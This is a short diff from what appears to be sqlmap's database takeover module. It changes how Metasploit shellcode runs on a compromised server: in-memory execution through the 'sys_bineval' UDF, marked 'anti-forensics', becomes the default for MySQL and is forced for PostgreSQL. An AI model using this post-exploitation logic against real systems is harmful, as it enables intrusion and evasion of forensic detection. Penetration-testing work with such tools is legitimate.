@@ -305,14 +305,13 @@ class Takeover(Abstraction, Metasploit, Registry):
         self.initEnv()
         self.getRemoteTempPath()
 
-        goUdf     = False
-        condition = ( kb.dbms == "MySQL" or kb.dbms == "PostgreSQL" )
+        goUdf = False
 
-        if condition is True:
+        if kb.dbms == "MySQL":
             msg  = "how do you want to execute the Metasploit shellcode "
             msg += "on the back-end database underlying operating system?"
-            msg += "\n[1] Stand-alone payload stager (file system way, default)"
-            msg += "\n[2] Via UDF 'sys_bineval' (in-memory way, anti-forensics)"
+            msg += "\n[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)"
+            msg += "\n[2] Stand-alone payload stager (file system way)"
 
             while True:
                 choice = readInput(msg, default=1)
@@ -328,8 +327,11 @@ class Takeover(Abstraction, Metasploit, Registry):
                     warnMsg = "invalid value, valid values are 1 and 2"
                     logger.warn(warnMsg)
 
-            if choice == 2:
+            if choice == 1:
                 goUdf = True
+
+        elif kb.dbms == "PostgreSQL":
+            goUdf = True
 
         if goUdf is True:
             self.createMsfShellcode(exitfunc="thread", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
